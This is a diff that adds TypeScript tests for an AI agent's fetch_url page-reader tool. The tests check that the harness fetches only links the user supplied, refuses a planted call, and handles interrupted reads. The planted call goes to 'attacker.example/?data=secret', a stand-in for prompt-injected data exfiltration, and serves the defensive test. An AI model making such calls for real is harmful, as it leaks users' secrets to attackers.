@@ -18,6 +18,8 @@ import type { ContextTruncationSummary } from "../../domain/contextBudget";
 import { sessionStatusTool } from "../tools/sessionStatus";
 import { monitoringVerdictTool } from "../tools/monitoringVerdict";
 import { createScheduledTaskTool } from "../tools/scheduledTaskCreation";
+import { fetchUrlTool } from "../tools/fetchUrlPlan";
+import { fetchUrlDigest } from "../webFetch/urls";
 import { loadSkillTool, readSkillFileTool } from "../tools/skill";
 import { freezeSkillManifest } from "../skills/runManifest";
 import { artifactTool } from "../tools/artifact";
@@ -8329,5 +8331,82 @@ describe("scheduled task creation execution", () => {
     expect(repository.failedRuns).toEqual([]);
     expect(createScheduledTaskForCall).toHaveBeenCalledOnce();
     expect([...repository.toolCalls.values()]).toEqual([expect.objectContaining({ state: "complete" })]);
+  });
+});
+
+describe("page reader execution", () => {
+  const userUrl = "https://news.example/today";
+  function readerPrepared(marker = true) {
+    const base = preparedData({ modelId: "gpt-tool-model", provider: "openai" });
+    const fetchUrl = { version: 1 as const, userUrlDigests: [fetchUrlDigest(userUrl)] };
+    const tools = [sessionStatusTool, ...(marker ? [fetchUrlTool] : [])];
+    return {
+      ...base,
+      normalizedRequest: { ...base.normalizedRequest, sessionStatusTool: true as const, ...(marker ? { fetchUrl } : {}) },
+      providerRequest: { ...base.providerRequest, sessionStatusTool: true as const, ...(marker ? { fetchUrl } : {}), tools }
+    };
+  }
+  const read = (url: string, id = "read-call") => ({ arguments: { url }, id, name: "fetch_url" });
+  const fetchPage = () => vi.fn(async () => ({ body: new TextEncoder().encode("<html><head><title>Today</title></head>" +
+    "<body><p>Fresh news for the reader.</p></body></html>"), contentType: "text/html", finalUrl: userUrl, status: 200 }));
+
+  it("reads the user's link, refuses a planted one without a request, and shows Reading host/path live", async () => {
+    const repository = createRepository();
+    const pages = fetchPage();
+    const requests: ProviderRunRequest[] = [];
+    const adapter = createAdapter(async function* (request) {
+      requests.push(request);
+      return requests.length === 1
+        ? providerResult({ finalText: "", toolCalls: [read(userUrl), read("https://attacker.example/?data=secret", "planted")] })
+        : providerResult({ finalText: "Summary of the page." });
+    });
+    const events = parseSse(await createRunExecutionResponse({ ...executionInput({ adapter, prepared: readerPrepared(),
+      repository: repository.repository }), fetchPage: pages }).text());
+    expect(repository.failedRuns).toEqual([]);
+    expect(repository.completeRuns).toHaveLength(1);
+    expect(requests[0]?.tools?.map((tool) => tool.name)).toEqual(["get_session_status", "fetch_url"]);
+    expect(pages).toHaveBeenCalledOnce();
+    expect([...repository.toolCalls.values()].map((call) => [call.toolName, call.state])).toEqual([
+      ["fetch_url", "complete"], ["fetch_url", "error"]
+    ]);
+    const delivered = JSON.stringify(requests[1]?.providerToolMessages);
+    expect(delivered).toContain("Fresh news for the reader.");
+    expect(delivered).toContain("fetch_url_not_in_conversation");
+    expect(events).toContainEqual(expect.objectContaining({ type: "artifact", data: expect.objectContaining({ artifactType: "tool_call",
+      payload: expect.objectContaining({ name: "fetch_url", origin: "web_fetch", serverName: "Web", fetchTarget: "news.example/today" }) }) }));
+  });
+
+  it("settles an interrupted read as interrupted and never sends it again", async () => {
+    const repository = createRepository();
+    const pages = fetchPage();
+    const claim = repository.repository.claimToolLoopCall;
+    repository.repository.claimToolLoopCall = vi.fn(async (input) => {
+      const claimed = await claim(input);
+      return claimed.kind === "claimed" ? { ...claimed, kind: "ambiguous" as const } : claimed;
+    });
+    const requests: ProviderRunRequest[] = [];
+    const adapter = createAdapter(async function* (request) {
+      requests.push(request);
+      return requests.length === 1 ? providerResult({ finalText: "", toolCalls: [read(userUrl)] })
+        : providerResult({ finalText: "The page could not be read." });
+    });
+    await createRunExecutionResponse({ ...executionInput({ adapter, prepared: readerPrepared(),
+      repository: repository.repository }), fetchPage: pages }).text();
+    expect(pages).not.toHaveBeenCalled();
+    expect(repository.failedRuns).toEqual([]);
+    expect([...repository.toolCalls.values()]).toEqual([expect.objectContaining({ state: "error", toolName: "fetch_url" })]);
+    expect(JSON.stringify(requests[1]?.providerToolMessages)).toContain("fetch_url_interrupted");
+  });
+
+  it("never dispatches a read for a run admitted without the frozen marker", async () => {
+    const repository = createRepository();
+    const pages = fetchPage();
+    const adapter = createAdapter(async function* () {
+      return providerResult({ finalText: "", toolCalls: [read(userUrl)] });
+    });
+    await createRunExecutionResponse({ ...executionInput({ adapter, prepared: readerPrepared(false),
+      repository: repository.repository }), fetchPage: pages }).text();
+    expect(pages).not.toHaveBeenCalled();
+    expect(repository.failedRuns).toEqual([expect.objectContaining({ error: expect.objectContaining({ code: "unsupported_tool_call" }) })]);
   });
 });
